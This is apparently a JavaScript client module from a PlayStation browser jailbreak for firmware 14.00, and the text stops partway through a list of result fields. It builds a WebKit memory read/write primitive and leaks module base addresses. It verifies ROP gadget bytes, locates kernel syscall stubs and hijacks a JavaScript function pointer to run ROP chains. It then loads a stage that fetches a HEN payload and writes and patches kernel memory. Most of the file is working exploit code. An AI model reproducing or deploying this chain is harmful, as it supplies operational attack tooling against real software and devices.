import { establishPrimitive } from "./core_hx1400_lowmap.js?v=hx1400-lowmap-2";
import { installWindowP, withdrawWindowP, pairStatus } from "./mem_hx1400_lowmap.js?v=hx1400-goldhen-dualmap-2";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";
import { sha256 } from "./sha256.js";
import {
  createFw14CommonCleanup,
  finishFw14AttemptCleanup,
  shouldRunLegacyWorkerCleanup,
} from "./fw14_cleanup.js?v=fw14-kdump-2";
import {
  FW14_GOLDHEN_DIRECT_PROFILE,
  buildFw14GoldhenLocalClaim,
  isFw14GoldhenDirectRoute,
} from "./fw14_goldhen_direct_contract.js?v=fw14-pages-direct-2";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0,
  failCount = 0;
let armedEver = false;
let fw14Leak2 = false;
let fw14Kdump = false;
let fw14Hx = false;
const fw14HxMode = "goldhen-dualmap";
let fw14KdumpAttemptConsumed = false;
let fw14HxAttemptConsumed = false;
let leak2ArmAttempted = false;
const LEAK2_ARM_KEY = "jb-fw14-leak2-arm-attempted";
const LEAK2_CLICK_KEY = "jb-fw14-leak2-click-token";
const KDUMP_ARM_KEY = "jb-fw14-kdump-arm-attempted";
const KDUMP_CLICK_KEY = "jb-fw14-kdump-click-token";
const HX_ARM_KEY = "jb-fw14-hx1400-goldhen-dualmap-arm-attempted";
const HX_CLICK_KEY = "jb-fw14-hx1400-goldhen-dualmap-click-token";
const STOP_BEFORE_DOUBLE = false;
const ORACLE_DIAGNOSTIC_PHASES = Object.freeze(["not-started","oracle-entered","round-1-request-validated","round-1-signature-before-ok","round-1-chain-built","round-1-bridge-returned","round-1-signature-after-ok","round-1-complete","round-2-request-validated","round-2-signature-before-ok","round-2-chain-built","round-2-bridge-returned","round-2-signature-after-ok","round-2-complete","authority-consumed","oracle-complete"]);
const ORACLE_DIAGNOSTIC_REASONS = Object.freeze(["none","request-validation","signature-read","signature-mismatch","chain-build","bridge-failed","capture","oracle-module-quarantine","unknown"]);
function validOracleDiagnostics(value) {
  const phase = value.oracleDiagnosticPhase;
  const reason = value.oracleDiagnosticReason;
  if (!ORACLE_DIAGNOSTIC_PHASES.includes(phase) || !ORACLE_DIAGNOSTIC_REASONS.includes(reason)) return false;
  const checks = value.oracleSignatureChecks;
  const started = value.oracleRoundsStarted;
  const completed = value.oracleRoundsCompleted;
  if (!Number.isInteger(checks) || checks < 0 || checks > 4 ||
      !Number.isInteger(started) || started < 0 || started > 2 ||
      !Number.isInteger(completed) || completed < 0 || completed > started ||
      value.oracleExecutions !== completed) return false;
  const expectedByPhase = {
    "not-started": [0, 0, 0], "oracle-entered": [0, 0, 0],
    "round-1-request-validated": [0, 0, 0], "round-1-signature-before-ok": [1, 0, 0],
    "round-1-chain-built": [1, 1, 0], "round-1-bridge-returned": [1, 1, 0],
    "round-1-signature-after-ok": [2, 1, 0], "round-1-complete": [2, 1, 1],
    "round-2-request-validated": [2, 1, 1], "round-2-signature-before-ok": [3, 1, 1],
    "round-2-chain-built": [3, 2, 1], "round-2-bridge-returned": [3, 2, 1],
    "round-2-signature-after-ok": [4, 2, 1], "round-2-complete": [4, 2, 2],
    "authority-consumed": [4, 2, 2], "oracle-complete": [4, 2, 2],
  }[phase];
  if (checks !== expectedByPhase[0] || started !== expectedByPhase[1] || completed !== expectedByPhase[2]) return false;
  if (value.oracleSignatureVerified !== (checks === 4 && completed === 2)) return false;
  if (value.oracleRopReadOnly !== (started > 0 && started === completed)) return false;
  if (value.oracleAuthorityConsumed !== (phase === "authority-consumed" || phase === "oracle-complete")) return false;
  if (value.oracleAttempted && phase === "not-started") return false;
  if (phase === "oracle-complete" && !(value.oracleCode === "OK_CURRENT_OWNER" &&
      completed === 2 && value.oracleCleanup && !value.oracleRebootRequired &&
      value.currentObjectsAuthenticated && value.oracleAuthorityConsumed)) return false;
  return true;
}


const VERBOSE = false;
const PROSE = [
  / -- /,
  /\.\s/,
  /;\s/,
  /,\s+(which|so|and that|because|since|as that)\s/,
  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
  /\s+so\s+[a-z]/,
  /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
  if (VERBOSE || s == null) return s;
  s = String(s);
  for (const re of PROSE) {
    const m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}

const SHOW_LOG = false;
function finishUI(ok) {
  if (SHOW_LOG || !document.body) return;
  const m = document.getElementById("msg");
  if (m)
    m.textContent = ok
      ? "GoldHEN launch dispatched; cold reboot now"
      : "Attempt stopped; cold reboot before another attempt";
  document.body.className = ok ? "done" : "fail";
}
function mark(tag, detail) {
  detail = terse(detail);
  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
  if (SHOW_LOG && outEl) {
    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines
      .map(function (l) {
        l = esc(l);
        const c =
          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED|GIVEUP|NO-STORAGE|UNSEEN/i.test(
            l,
          )
            ? "bad"
            : /WARN|SKIP|REFUS|COMMITTED|DIRTY/i.test(l)
              ? "warn"
              : /\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)
                ? "ok"
                : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
      })
      .join("\n");
    outEl.scrollTop = outEl.scrollHeight;
  }
}

function trace(tag, detail) {
  if (VERBOSE) mark(tag, detail);
}
function state(t, c) {
  if (!stateEl) return;
  stateEl.textContent = t;
  stateEl.className = c || "";
}
function check(name, ok, detail) {
  if (ok) {
    passCount++;
    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
  } else {
    failCount++;
    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
  }
  return ok;
}

const SYS = {
  getpid: 20,
  getuid: 0x18,
  close: 6,
  socket: 97,
  socketpair: 0x87,
  getsockopt: 118,
  setsockopt: 0x69,
  mmap: 477,
  munmap: 73,
  thr_self: 432,
  getgroups: 79,
  getgid: 47,
  cpuset_getaffinity: 487,
  cpuset_setaffinity: 488,
  aio_multi_poll: 664,
  aio_multi_delete: 662,
  getegid: 43,
  aio_multi_wait: 663,
  aio_multi_cancel: 666,
  aio_submit_cmd: 669,
  write: 4,
  sysctl: 202,
  nanosleep: 240,
  kill: 37,
  getppid: 39,
};
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
const hxQuarantineKeepAlive = [];
let mainMf = null,
  mainOrig = null,
  mainArmed = false;
let pinRestore = null;

let jbRestoreHook = null;
let allDone = false,
  jailbroken = false,
  kpatched = false;

export function restoreHx1400GoldhenDualmapGlobalDescriptor(name, descriptor) {
  if (descriptor === undefined) {
    if (!delete globalThis[name] || Object.prototype.hasOwnProperty.call(globalThis, name))
      throw new Error(`could not withdraw global ${name}`);
    return;
  }
  Object.defineProperty(globalThis, name, descriptor);
}

export async function startHx1400GoldhenDualmapClient() {
  const originalPDescriptor = Object.getOwnPropertyDescriptor(globalThis, "p");
  const originalNativeCtorDescriptor =
    Object.getOwnPropertyDescriptor(globalThis, "__ps5NativeCtor");
  const restorePublicPrimitive = () =>
    restoreHx1400GoldhenDualmapGlobalDescriptor("p", originalPDescriptor);
  const restoreNativeCtor = () =>
    restoreHx1400GoldhenDualmapGlobalDescriptor(
      "__ps5NativeCtor",
      originalNativeCtorDescriptor,
    );
  if (originalPDescriptor && originalPDescriptor.configurable !== true)
    throw new Error("global p is not safely replaceable");
  let p = null;
  let primitiveCarrier = null;
  let hxPrimitiveCleanupAttempted = false;
  let hxPrimitiveWithdrawn = false;
  let hxPrimitiveQuarantined = false;
  let hxPrimitiveCleanupReason = "";

  const opened = [];
  let closeFd = null;
  const managedWorkers = [];
  let kdumpChallenge = null;
  let hxClaim = null;
  let hxResult = null;
  let hxResultFinalizedLocally = false;
  let fw14AioCleanup = null;
  let restoreManagedWorker = null;
  let fw14TerminalError = "";
  let fw14Miss = false;
  let fw14CleanupIncomplete = false;
  let fw14CleanupAttempted = false;
  let fw14CommonCleanup = null;
  let fw14HostCommonCleanupVerified = false;
  const quarantineHxPrimitive = (reason) => {
    hxPrimitiveCleanupReason = String(reason);
    restorePublicPrimitive();
    restoreNativeCtor();
    if (hxPrimitiveQuarantined || primitiveCarrier === null) return;
    hxPrimitiveQuarantined = true;
    hxQuarantineKeepAlive.push(
      Object.freeze({
        reason: hxPrimitiveCleanupReason,
        carrier: primitiveCarrier,
        primitive: p,
        buffers: keepAlive,
        opened,
        workers: managedWorkers,
        mainFunction: mainMf,
        mainOriginal: mainOrig,
        commonCleanup: fw14CommonCleanup,
        closeDescriptor: closeFd,
      }),
    );
    mark("FW14-HX1400-GOLDHEN-PRIMITIVE-QUARANTINE", hxPrimitiveCleanupReason);
  };
  const withdrawHxPrimitive = () => {
    if (hxPrimitiveWithdrawn) return true;
    if (hxPrimitiveCleanupAttempted) return false;
    hxPrimitiveCleanupAttempted = true;
    if (mainArmed || !fw14HostCommonCleanupVerified) {
      quarantineHxPrimitive("host resources were not restored before primitive withdrawal");
      return false;
    }
    let report;
    try {
      Object.defineProperty(globalThis, "p", {
        value: p,
        writable: true,
        enumerable: true,
        configurable: true,
      });
      report = withdrawWindowP(primitiveCarrier);
    } finally {
      restorePublicPrimitive();
    }
    if (!report.verified) {
      quarantineHxPrimitive(report.reason || "primitive withdrawal did not verify");
      return false;
    }
    primitiveCarrier = null;
    p = null;
    mainMf = null;
    mainOrig = null;
    hxPrimitiveWithdrawn = true;
    mark(
      "FW14-HX1400-GOLDHEN-PRIMITIVE-WITHDRAW",
      "carrier_home=1 global_p=0 core_roots=0 verified=1",
    );
    return true;
  };
  try {
    const { key, off } = offsetsFor(navigator.userAgent);
    mark("BUILD", "jb=skipjb2 base=ef1670a");
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      state("no offsets for this firmware", "bad");
      return;
    }
    const fwKey = key || "unknown";
    fw14Hx =
      fwKey === "14.00" &&
      isFw14GoldhenDirectRoute(location, import.meta.url);
    if (!fw14Hx) {
      mark(
        "FW14-HX1400-GOLDHEN-REFUSE",
        "requires firmware=14.00 and the exact project-root route with no query or fragment",
      );
      state("FW14 Hx1400 GoldHEN route identity required", "bad");
      return;
    }
    if (fw14Hx) {
      mark(
        "FW14-HX1400-GOLDHEN-RISK",
        "one consumed run may write kernel memory, patch kernel text, crash the console, and requires a cold reboot after every outcome",
      );
      try {
        if (sessionStorage.getItem(HX_CLICK_KEY) !== "1")
          throw new Error("explicit click token missing");
        sessionStorage.removeItem(HX_CLICK_KEY);
        if (sessionStorage.getItem(HX_CLICK_KEY) !== null)
          throw new Error("click token could not be consumed");
        if (sessionStorage.getItem(HX_ARM_KEY) !== null)
          throw new Error("Hx1400 GoldHEN attempt already consumed in this tab");
        sessionStorage.setItem(HX_ARM_KEY, "1");
        if (sessionStorage.getItem(HX_ARM_KEY) !== "1")
          throw new Error("Hx1400 GoldHEN latch did not read back");
        fw14HxAttemptConsumed = true;
      } catch (e) {
        mark("FW14-HX1400-GOLDHEN-REFUSE", (e && e.message) || String(e));
        state("One-shot token refused; cold reboot before another attempt", "bad");
        return;
      }

      try {
        hxClaim = buildFw14GoldhenLocalClaim();
        const keys = Object.keys(hxClaim);
        const patchKeys = Object.keys(hxClaim.patch);
        const henKeys = Object.keys(hxClaim.hen);
        if (
          keys.length !== 6 ||
          !keys.every((name) => ["schema","run_id","challenge_hex","max_arms","patch","hen"].includes(name)) ||
          patchKeys.length !== 3 ||
          !patchKeys.every((name) => ["sha256","size","offset"].includes(name)) ||
          henKeys.length !== 5 ||
          !henKeys.every((name) => ["sha256","size","offset","head","entry"].includes(name)) ||
          hxClaim.schema !== "oms.fw14-hx1400-goldhen-dualmap.claim.v1" ||
          !/^[0-9a-f]{32}$/.test(hxClaim.run_id) ||
          !/^[0-9a-f]{64}$/.test(hxClaim.challenge_hex) ||
          hxClaim.max_arms !== 32 ||
          !Object.isFrozen(hxClaim) ||
          !Object.isFrozen(hxClaim.patch) ||
          !Object.isFrozen(hxClaim.hen)
        ) throw new Error("local claim schema invalid");
      } catch (e) {
        fw14TerminalError = (e && e.message) || String(e);
        mark("FW14-HX1400-GOLDHEN-CLAIM-FAIL", fw14TerminalError);
        state("Local claim failed closed; cold reboot before another attempt", "bad");
        return;
      }
      mark(
        "FW14-HX1400-GOLDHEN-DUALMAP-MODE",
        "run=" + hxClaim.run_id +
          " max_arms=" + hxClaim.max_arms +
          " slots=" + FW14_GOLDHEN_DIRECT_PROFILE.slots +
          " groom=drain:" + FW14_GOLDHEN_DIRECT_PROFILE.drain +
          " patch_aliases=rw+rx hen_map=postpatch-rwx",
      );
    }


    const NEED_K = [];
    const missing = NEED_K.filter((k) => off[k] === undefined);
    if (
      !check(
        "kernel-table-present",
        missing.length === 0,
        "fw=" +
          fwKey +
          " missing=[" +
          missing.join(",") +
          "]" +
          " -- dump this firmware with kdump5.html and derive its table" +
          " with tools/kderive.py; stage=pre_primitive",
      )
    )
      return;

    mark("FW-STATUS", off.fw_status || "none");
    mark(
      "FW-KTABLE",
      "hx1400=runtime-kbase source=hx1400_data.js owner=private lease=jit-capability-v1",
    );

    // ---- benign-miss auto-retry (reads only, before any kernel write) ----
    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
    // phase -- no kernel .data/.text has been touched yet, so reloading and
    // retrying is safe. The counter lives in sessionStorage so it survives
    // the reload and is cleared the moment the read phase succeeds, so a
    // later manual run always starts fresh. NEVER call retryBenign() after a
    // kernel write: a reload would re-enter with the kernel already modified.
    // A hard KP (a total reclaim miss that faults inside the cancel walk)
    // cannot be caught here and still needs a reboot -- this only recovers
    // the benign, detectable misses.
    const RETRY_MAX = 0;
    const RETRY_KEY = "jb-fw14-hx1400-goldhen-dualmap-read-retry";
    const retryCount = () => {
      try {
        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
        return Number.isFinite(v) && v > 0 ? v : 0;
      } catch (e) {
        return 0;
      }
    };
    const clearRetry = () => {
      try {
        sessionStorage.removeItem(RETRY_KEY);
      } catch (e) {}
    };
    const retryBenign = (why) => {
      const n = retryCount();
      if (n >= RETRY_MAX) {
        mark(
          "AUTO-RELOAD-GIVEUP",
          "why=" + why + " reloads=" + n + " -- reboot and try again",
        );
        return false;
      }
      let stored = -1;
      try {
        sessionStorage.setItem(RETRY_KEY, String(n + 1));
        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
      } catch (e) {
        stored = -1;
      }
      if (stored !== n + 1) {
        mark(
          "AUTO-RELOAD-NO-STORAGE",
          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
        );
        return false;
      }
      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
      setTimeout(() => {
        try {
          location.reload();
        } catch (e) {}
      }, 400);
      return true;
    };
    if (retryCount() > 0)
      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);

    state("running the primitive...", "warn");
    await new Promise((r) => setTimeout(r, 0));

    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
    try {
      primitiveCarrier = await establishPrimitive({
        maxAttempts: fw14Kdump || fw14Hx ? 2 : fw14Leak2 ? 1 : 6,
        safeRetriesOnly: fw14Kdump || fw14Hx,
        onEvent: (t, d, a) =>
          (PRIMITIVE_LOUD.test(t) ? mark : trace)(
            t,
            (a != null ? "[" + a + "] " : "") + (d || ""),
          ),
      });
    } finally {
      restoreNativeCtor();
    }
    try {
      if (
        originalPDescriptor !== undefined &&
        (!delete globalThis.p ||
          Object.prototype.hasOwnProperty.call(globalThis, "p"))
      )
        throw new Error("global p could not be prepared for private installation");
      p = installWindowP(primitiveCarrier, { promote: false });
      if (globalThis.p !== p) throw new Error("window.p was not installed");
    } finally {
      restorePublicPrimitive();
    }
    mark(
      "PAIR-STATUS",
      "state=" +
        pairStatus.state +
        " promoted=" +
        pairStatus.promoted +
        "   (promotion off: the 137 MB stays pinned)",
    );
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(
      p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function),
    );
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    const libkernelBase = errorFn.sub32(off.k__error);
    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
    const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
    if (
      !check(
        "module-bases-0x4000-aligned",
        aligned(webkitBase) && aligned(libkernelBase),
        "",
      )
    )
      return;

    const G = {};
    const GAD = [
      ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
      ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
      ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
      ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
      ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
      ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
      ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
      ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
      [
        "MOV_RDI_RAX_RET",
        off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
        [0x48, 0x89, 0x07, 0xc3],
      ],
      ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
      ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
      ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
      ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
      [
        "G4",
        off.wk_MOV_RDX_RAX_18_CALL_10,
        [0x48, 0x8b, 0x50, off.pivot_view_sp],
      ],
      ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
      const a = webkitBase.add32(rva);
      let good = true;
      for (let i = 0; i < pat.length; ++i) {
        if (pat[i] === null) continue;
        if (p.read1(a.add32(i)) !== pat[i]) {
          good = false;
          break;
        }
      }
      if (good) {
        G[nm] = a;
        gated++;
      } else mark("GADGET-BAD", nm);
    }
    if (
      !check(
        "gadget-table-fits-module",
        gated === GAD.length,
        gated + "/" + GAD.length,
      )
    )
      return;
    const argGadget = [
      G.POP_RDI_RET,
      G.POP_RSI_RET,
      G.POP_RDX_RET,
      G.POP_RCX_RET,
      G.POP_R8_RET,
      G.POP_R9_RET,
    ];

    const stubAddr = new Map();
    let seeded = 0;
    if (off.k_stubs) {
      for (const numStr in off.k_stubs) {
        const num = +numStr,
          o = off.k_stubs[numStr];
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
        if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 !== num)
          continue;
        stubAddr.set(num, libkernelBase.add32(o));
        seeded++;
      }
    }
    const need = new Set(
      Object.keys(SYS)
        .map((k) => SYS[k])
        .filter((n) => !stubAddr.has(n)),
    );
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
      const v = p.read8(libkernelBase.add32(o));
      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
      const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
      if (!need.has(num)) continue;
      stubAddr.set(num, libkernelBase.add32(o));
      need.delete(num);
      scanned++;
    }
    mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
    const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
      return;
    function resolveSyscallStub(num) {
      if (stubAddr.has(num)) return stubAddr.get(num);
      for (let o = 0; o < off.k_scan_stage1; o += 16) {
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
          continue;
        if (
          ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 ===
          (num >>> 0)
        ) {
          const address = libkernelBase.add32(o);
          stubAddr.set(num, address);
          return address;
        }
      }
      return null;
    }

    function bufAddr(ab) {
      const c = p.leakval(ab);
      return p.read8(
        p
          .read8(c.add32(off.wk_ArrayBuffer_m_impl))
          .add32(off.wk_ArrayBuffer_m_contents_m_data),
      );
    }
    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
      }
    }
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    const ROP_STACK_SIZE = fw14Kdump ? 0x20000 : 0x2000;
    function makeCtx() {
      const sb = new ArrayBuffer(0x20),
        pb = new ArrayBuffer(PB_SIZE);
      const kb = new ArrayBuffer(ROP_STACK_SIZE),
        fb = new ArrayBuffer(0x40);
      keepAlive.push(sb, pb, kb, fb);
      const c = {
        storeDv: new DataView(sb),
        pivotDv: new DataView(pb),
        stackDv: new DataView(kb),
        frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb),
        frameU8: new Uint8Array(fb),
      };
      keepAlive.push(
        c.storeDv,
        c.pivotDv,
        c.stackDv,
        c.frameDv,
        c.stackU8,
        c.frameU8,
      );
      c.S = bufAddr(sb);
      c.P = bufAddr(pb);
      c.K = bufAddr(kb);
      c.F = bufAddr(fb);
      put(c.storeDv, 0x00, G.G1);
      put(c.storeDv, 0x08, c.P);
      put(c.storeDv, 0x10, G.G3);
      put(c.storeDv, 0x18, G.G2);
      put(c.pivotDv, 0x00, c.P);
      put(c.pivotDv, 0x10, G.G5);
      put(c.pivotDv, 0x20, G.G4);
      return c;
    }
    function layout(c, target, args) {
      c.stackU8.fill(0);
      c.frameU8.fill(0);
      const insts = [];
      for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
      }
      const targetIdx = insts.length;
      insts.push(target);
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = c.stackU8.length - 8 * insts.length;
      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
      for (let i = 0; i < insts.length; ++i)
        put(c.stackDv, at + 8 * i, insts[i]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    function layoutBatch(c, calls) {
      c.stackU8.fill(0);
      c.frameU8.fill(0);
      const insts = [];
      let firstTargetIdx = -1;
      for (const call of calls) {
        if (!call || !call.target || !Array.isArray(call.args))
          throw new Error("invalid ROP batch call");
        if (call.args.length > argGadget.length)
          throw new Error("ROP batch has too many arguments");
        for (let i = 0; i < call.args.length; i++) {
          insts.push(argGadget[i]);
          insts.push(call.args[i]);
        }
        if (firstTargetIdx < 0) firstTargetIdx = insts.length;
        insts.push(call.target);
        insts.push(G.POP_RDI_RET);
        insts.push(call.ret);
        insts.push(G.MOV_RDI_RAX_RET);
      }
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = c.stackU8.length - 8 * insts.length;
      if (at < 0x100) throw new Error("ROP batch exceeds stack");
      if (((c.K.low + at + 8 * firstTargetIdx) & 0xf) !== 0) at -= 8;
      for (let i = 0; i < insts.length; i++)
        put(c.stackDv, at + 8 * i, insts[i]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    const M = makeCtx();
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    function fireMainContext() {
      const saved = p.read8(pivotCell);
      try {
        p.write8(pivotCell, M.S);
        Math.expm1(pivotObj);
      } finally {
        p.write8(pivotCell, saved);
      }
    }
    function callAddr(target, args) {
      if (!target) throw new Error("native target is unavailable");
      layout(M, target, args);
      fireMainContext();
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
    function callBatch(calls) {
      layoutBatch(M, calls);
      fireMainContext();
    }
    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    closeFd = (fd) => sc(SYS.close, fd).i32;
    if (fw14Kdump || fw14Hx) {
      fw14CommonCleanup = createFw14CommonCleanup({
        workers: managedWorkers,
        restoreWorker: async (worker) => {
          await restoreManagedWorker(worker, true);
        },
        liveFds: opened,
        closeFd: (fd) => {
          if (!closeFd) throw new Error("descriptor cleanup syscall unavailable");
          return closeFd(fd);
        },
        restoreAffinity: () => {
          if (!pinRestore) return true;
          if (pinRestore() !== true) return false;
          pinRestore = null;
          return true;
        },
        restoreMainPivot: () => {
          if (!mainArmed) return true;
          if (!mainMf || !mainOrig || !p)
            throw new Error("main pivot restoration prerequisites missing");
          p.write8(mainMf, mainOrig);
          const mainBack = p.read8(mainMf);
          if (
            mainBack.low !== mainOrig.low ||
            mainBack.hi !== mainOrig.hi
          )
            return false;
          mainArmed = false;
          mark("FW14-MAIN-PIVOT-RESTORE", "verified=1");
          return true;
        },
        clearBuffers: () => {
          const zeroedBuffers = [];
          let zeroedBytes = 0;
          for (const value of keepAlive) {
            const buffer =
              value instanceof ArrayBuffer
                ? value
                : ArrayBuffer.isView(value)
                  ? value.buffer
                  : null;
            if (!buffer || zeroedBuffers.indexOf(buffer) !== -1) continue;
            new Uint8Array(buffer).fill(0);
            zeroedBuffers.push(buffer);
            zeroedBytes += buffer.byteLength;
          }
          keepAlive.length = 0;
          return { buffers: zeroedBuffers.length, bytes: zeroedBytes };
        },
        emit: mark,
      });
    }

    const pid = sc(SYS.getpid).i32;
    check(
      "chain-reaches-kernel",
      pid > 0,
      "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
    );

    if (fw14Hx) {
      const {
        finalizeHx1400GoldhenDualmapHostCleanup,
        runHx1400GoldhenDualmapStage,
      } = await import("./hx1400_goldhen_dualmap_stage.js?v=hx1400-goldhen-dualmap-2");
      const forgetFd = (fd) => {
        const index = opened.indexOf(fd);
        if (index < 0) return false;
        opened.splice(index, 1);
        return true;
      };
      const context = Object.freeze({
        firmware: fwKey,
        claim: hxClaim,
        p,
        int64,
        syscall: sc,
        resolveSyscallStub,
        bufAddr,
        sha256: async (bytes) => sha256(bytes),
        async fetchHen() {
          const henUrl = new URL("./hen.bin", import.meta.url);
          if (henUrl.origin !== location.origin)
            throw new Error("HEN URL is not same-origin");
          const response = await fetch(henUrl, {
            method: "GET",
            cache: "no-store",
            credentials: "omit",
            redirect: "error",
          });
          if (!response.ok) throw new Error("HEN HTTP " + response.status);
          return new Uint8Array(await response.arrayBuffer());
        },
        callAddr,
        libkernelBase,
        off,
        trackFd(fd) {
          if (!Number.isInteger(fd) || fd < 0)
            throw new Error("invalid tracked descriptor");
          if (!opened.includes(fd)) opened.push(fd);
          return fd;
        },
        releaseFd: forgetFd,
        detachFd: forgetFd,
        retainQuarantine(capsule) {
          if (!capsule || typeof capsule !== "object")
            throw new Error("invalid quarantine capsule");
          if (Array.isArray(capsule.retainedFds)) {
            for (const fd of capsule.retainedFds)
              if (Number.isInteger(fd) && fd >= 0) forgetFd(fd);
          }
          hxQuarantineKeepAlive.push(capsule);
          return capsule;
        },
        emit: mark,
        check,
      });
      state("Running the one-shot Hx1400 32-arm GoldHEN dual-map successor", "warn");
      hxResult = await runHx1400GoldhenDualmapStage(context);
      const resultKeys = [
        "schema",
        "ok",
        "code",
        "runId",
        "kbaseValidated",
        "maxArms",
        "armsAttempted",
        "possibleBlindWrites",
        "armRecords",
        "pairEstablished",
        "pairRound",
        "pairCandidateIndex",
        "pairCandidateFd",
        "pairTargetIndex",
        "pairTargetFd",
        "kvaSearchOutcome",
        "kvaSearchAttempts",
        "kvaSearchFd",
        "kvaSearchRc",
        "kvaSearchRef",
        "kvaSearchTreeAccepted",
        "rotationAttempted",
        "rotationError",
        "rotationRc",
        "rotationExpectedOpsMatch",
        "rotationPredicateMask",
        "kernelRwProved",
        "challengeWriteAttempted",
        "challengeWritten",
        "challengeRestored",
        "lowMapPolicyValidated",
        "lowMapMapped",
        "lowMapLeaseAcquired",
        "lowMapUnmapped",
        "lowMapLeaseRevoked",
        "aioCleanupVerified",
        "quarantined",
        "stageCleanupVerified",
        "hostCleanupVerified",
        "cleanupVerified",
        "rebootRequired",
        "oracleAttempted",
        "oracleCode",
        "oracleKernelMutated",
        "oracleCleanup",
        "oracleRebootRequired",
        "oracleExecutions",
        "oracleSignatureVerified",
        "oracleRopReadOnly",
        "oracleAuthorityConsumed",
        "oracleDiagnosticPhase",
        "oracleDiagnosticReason",
        "oracleSignatureChecks",
        "oracleRoundsStarted",
        "oracleRoundsCompleted",
